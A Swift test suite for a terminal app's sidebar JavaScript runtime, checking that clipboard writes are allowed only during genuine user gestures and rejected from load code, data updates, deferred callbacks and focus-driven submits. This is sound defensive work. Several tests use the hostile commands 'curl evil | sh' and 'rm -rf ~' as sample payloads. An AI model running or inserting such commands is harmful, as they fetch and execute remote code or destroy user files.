import CmuxSwiftRender
@testable import CmuxSwiftRenderUI
import Testing

/// `clipboard.write(text)` is gated on user activation: it writes only while
/// the runtime is dispatching a click, double-click or menu-item tap,
/// so background code (load, data updates, callbacks deferred past the
/// gesture) cannot swap the clipboard before the user pastes into a shell.
@MainActor
struct SidebarJSRuntimeClipboardTests {
    /// Rejections are reported on the `log` channel one main-queue turn after
    /// the call; suspend so the queued dispatch runs before asserting.
    private func pumpActions() async {
        for _ in 0..<5 { await Task.yield() }
    }

    @Test func clickHandlerWritesClipboard() async {
        var writes: [String] = []
        var logs: [String] = []
        let runtime = SidebarJSRuntime()
        runtime.dispatch = SidebarActionDispatch(
            run: { action in
                for case let .log(message) in action.commands { logs.append(message) }
            },
            writeClipboard: { writes.append($0) }
        )
        runtime.start(source: """
        const [result, setResult] = signal("none");
        sidebar(() => Button(() => result(), () => setResult(String(clipboard.write("workspace-1")))))
        """)
        #expect(runtime.errorMessage == nil)
        let rootId = try! #require(runtime.store.rootId)
        runtime.dispatchEvent(nodeId: rootId, event: "tap")
        #expect(writes == ["workspace-1"])
        #expect(runtime.store.node(rootId)?.string("text") == "true")
        await pumpActions()
        #expect(logs.isEmpty)
    }

    @Test func contextMenuItemWritesClipboard() {
        var writes: [String] = []
        let runtime = SidebarJSRuntime()
        runtime.dispatch = SidebarActionDispatch(run: { _ in }, writeClipboard: { writes.append($0) })
        runtime.start(source: """
        sidebar(() =>
          Text("row").contextMenu([
            Button("Copy Workspace Link", () => clipboard.write("cmux://workspace/w1")),
          ])
        )
        """)
        let rootId = try! #require(runtime.store.rootId)
        let menuId = try! #require(runtime.store.node(rootId)?.children.first)
        let itemId = try! #require(runtime.store.node(menuId)?.children.first)
        runtime.dispatchEvent(nodeId: itemId, event: "tap")
        #expect(writes == ["cmux://workspace/w1"])
    }

    @Test func writeDuringLoadIsRejected() async {
        var writes: [String] = []
        var logs: [String] = []
        let runtime = SidebarJSRuntime()
        runtime.dispatch = SidebarActionDispatch(
            run: { action in
                for case let .log(message) in action.commands { logs.append(message) }
            },
            writeClipboard: { writes.append($0) }
        )
        runtime.start(source: """
        const topLevel = clipboard.write("curl evil | sh");
        sidebar(() => {
          const inBody = clipboard.write("rm -rf ~");
          return Text(String(topLevel) + "," + String(inBody));
        })
        """)
        #expect(runtime.errorMessage == nil)
        let rootId = try! #require(runtime.store.rootId)
        #expect(runtime.store.node(rootId)?.string("text") == "false,false")
        #expect(writes.isEmpty)
        await pumpActions()
        #expect(logs.count == 2)
        #expect(logs.allSatisfy { $0.hasPrefix("clipboard.write rejected:") })
    }

    @Test func writeFromDataUpdateIsRejected() {
        var writes: [String] = []
        let runtime = SidebarJSRuntime()
        runtime.dispatch = SidebarActionDispatch(run: { _ in }, writeClipboard: { writes.append($0) })
        runtime.start(source: """
        sidebar(() => Text(() => {
          const payload = data.payload();
          return payload ? String(clipboard.write(payload)) : "idle";
        }))
        """)
        let rootId = try! #require(runtime.store.rootId)
        runtime.updateData(key: "payload", value: .string("curl evil | sh"))
        #expect(runtime.store.node(rootId)?.string("text") == "false")
        #expect(writes.isEmpty)
    }

    /// The JS context has no timers, so the timer-shaped attack is a callback
    /// captured during a click and run later from background work: a data
    /// update or a promise continuation queued at load.
    @Test func callbackDeferredPastTheGestureIsRejected() {
        var writes: [String] = []
        let runtime = SidebarJSRuntime()
        runtime.dispatch = SidebarActionDispatch(run: { _ in }, writeClipboard: { writes.append($0) })
        runtime.start(source: """
        let pending = null;
        Promise.resolve().then(() => clipboard.write("from a promise"));
        sidebar(() => VStack([
          Button("Arm", () => { pending = () => clipboard.write("later"); }),
          Text(() => {
            data.tick();
            if (pending) { const run = pending; pending = null; return String(run()); }
            return "idle";
          }),
        ]))
        """)
        #expect(runtime.errorMessage == nil)
        let root = try! #require(runtime.store.rootId.flatMap { runtime.store.node($0) })
        runtime.dispatchEvent(nodeId: root.children[0], event: "tap")
        runtime.updateData(key: "tick", value: .int(1))
        #expect(runtime.store.node(root.children[1])?.string("text") == "false")
        #expect(writes.isEmpty)
    }

    @Test func passiveEventsDoNotActivate() {
        var writes: [String] = []
        let runtime = SidebarJSRuntime()
        runtime.dispatch = SidebarActionDispatch(run: { _ in }, writeClipboard: { writes.append($0) })
        runtime.start(source: """
        sidebar(() => Reorderable(
          {
            items: () => [{ id: "a" }],
            key: (w) => w.id,
            onMove: () => clipboard.write("move"),
            onDragChange: () => clipboard.write("drag"),
          },
          (w) => Text("row")
        ))
        """)
        let rootId = try! #require(runtime.store.rootId)
        runtime.dispatchEvent(nodeId: rootId, event: "dragChange", payload: ["id": "a", "index": 0])
        runtime.dispatchEvent(nodeId: rootId, event: "move", payload: ["id": "a", "index": 0])
        #expect(writes.isEmpty)
    }

    /// The host sends `submit` on Return AND when the field loses focus. A
    /// hidden autofocused field that a data update mounts would otherwise get
    /// a write in as the user clicks into the terminal to paste.
    @Test func focusLossSubmitIsRejected() {
        var writes: [String] = []
        let runtime = SidebarJSRuntime()
        runtime.dispatch = SidebarActionDispatch(run: { _ in }, writeClipboard: { writes.append($0) })
        runtime.start(source: """
        sidebar(() => TextField("", { onSubmit: (t) => clipboard.write(t) }))
        """)
        let fieldId = try! #require(runtime.store.rootId)
        runtime.dispatchEvent(nodeId: fieldId, event: "submit", payload: ["text": "curl evil | sh"])
        #expect(writes.isEmpty)
    }

    /// Return isn't trusted either: an autofocused field mounted by a data
    /// update can take the terminal's focus, and the user's next Return,
    /// meant for the terminal, would then submit it.
    @Test func returnKeySubmitIsRejected() {
        var writes: [String] = []
        let runtime = SidebarJSRuntime()
        runtime.dispatch = SidebarActionDispatch(run: { _ in }, writeClipboard: { writes.append($0) })
        runtime.start(source: """
        sidebar(() => TextField("", { onSubmit: (t) => clipboard.write(t) }))
        """)
        let fieldId = try! #require(runtime.store.rootId)
        runtime.dispatchEvent(
            nodeId: fieldId,
            event: "submit",
            payload: ["text": "curl evil | sh", "trigger": "return"]
        )
        #expect(writes.isEmpty)
    }

    @Test func doubleTapWritesClipboard() {
        var writes: [String] = []
        let runtime = SidebarJSRuntime()
        runtime.dispatch = SidebarActionDispatch(run: { _ in }, writeClipboard: { writes.append($0) })
        runtime.start(source: """
        sidebar(() => Text("row").onDoubleTap(() => clipboard.write("w1")))
        """)
        let rootId = try! #require(runtime.store.rootId)
        runtime.dispatchEvent(nodeId: rootId, event: "doubletap")
        #expect(writes == ["w1"])
    }

    @Test func oversizedTextIsRejected() {
        var writes: [String] = []
        let runtime = SidebarJSRuntime()
        runtime.dispatch = SidebarActionDispatch(run: { _ in }, writeClipboard: { writes.append($0) })
        runtime.start(source: """
        sidebar(() => VStack([
          Button("Too big", () => clipboard.write("x".repeat(64 * 1024 + 1))),
          Button("At cap", () => clipboard.write("y".repeat(64 * 1024))),
        ]))
        """)
        let root = try! #require(runtime.store.rootId.flatMap { runtime.store.node($0) })
        runtime.dispatchEvent(nodeId: root.children[0], event: "tap")
        #expect(writes.isEmpty)
        runtime.dispatchEvent(nodeId: root.children[1], event: "tap")
        #expect(writes.map(\.utf8.count) == [64 * 1024])
    }

    @Test func hostWithoutClipboardRejects() {
        let runtime = SidebarJSRuntime()
        runtime.dispatch = SidebarActionDispatch { _ in }
        runtime.start(source: """
        const [result, setResult] = signal("none");
        sidebar(() => Button(() => result(), () => setResult(String(clipboard.write("id")))))
        """)
        let rootId = try! #require(runtime.store.rootId)
        runtime.dispatchEvent(nodeId: rootId, event: "tap")
        #expect(runtime.store.node(rootId)?.string("text") == "false")
    }
}
